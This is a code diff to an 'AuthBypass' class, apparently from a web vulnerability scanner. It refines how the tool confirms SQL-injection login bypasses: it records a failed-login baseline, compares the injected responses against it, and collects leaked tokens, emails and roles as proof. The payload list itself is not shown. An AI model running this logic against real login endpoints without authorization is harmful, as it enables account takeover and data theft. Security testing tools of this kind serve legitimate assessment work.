@@ -189,14 +189,26 @@ class AuthBypass:
         m = re.search(rf'"{field}"\s*:\s*"?([^",\}}\]{{]+)"?', body)
         return m.group(1).strip() if m else None
 
-    def _sqli_confirmed(self, body: str, token: str | None, email: str | None, role: str | None) -> bool:
-        if token and len(token) > 20:
+    def _sqli_confirmed(self, body: str, token: str | None, email: str | None,
+                        role: str | None, baseline_body: str = "") -> bool:
+        """Confirm SQLi by comparing the injected response against a *known-bad* baseline.
+        Many APIs return tokens on every response (CSRF, session-init), so a token
+        alone is not sufficient — we require it to appear in the injected response
+        but NOT in the same position in the failed-login baseline."""
+        baseline_token = self._extract_token(baseline_body) if baseline_body else None
+        # Token present in injected response but absent in the failed-login baseline
+        if token and len(token) > 20 and not baseline_token:
             return True
+        # Email returned — failed logins virtually never echo the account email
         if email and "@" in email:
             return True
+        # Explicit role field in response — failed logins don't include role
         if role and len(role) > 2:
             return True
+        # Body-level success + structured data (but only if baseline didn't show same)
         if self._has_auth_success(body) and self._has_data(body):
+            if baseline_body and self._has_auth_success(baseline_body):
+                return False  # site shows "success" on failed logins too — not confirmed
             return True
         return False
 
@@ -207,6 +219,13 @@ class AuthBypass:
             await delay()
             if s0 is None:
                 continue
+            # Capture a genuine failed-login baseline to use in confirmation check
+            _bl_s, baseline_body, _ = await self._post(
+                sess, path,
+                json_data={"email": "no_such_user_baseline@notreal.invalid",
+                           "password": "baseline_wrong_password_xyz_mirror"})
+            await delay()
+            baseline_body = baseline_body or ""
             for desc, u_payload, p_payload in SQL_PAYLOADS:
                 for username_field in LOGIN_FIELDS:
                     payload = {username_field: u_payload, "password": p_payload}
@@ -220,7 +239,7 @@ class AuthBypass:
                     email = self._extract_json_field(body, "email")
                     role  = self._extract_json_field(body, "role")
                     uid   = self._extract_json_field(body, "id") or self._extract_json_field(body, "user_id")
-                    if not self._sqli_confirmed(body, token, email, role):
+                    if not self._sqli_confirmed(body, token, email, role, baseline_body):
                         continue
                     proof = (
                         f"POST {path}\n"
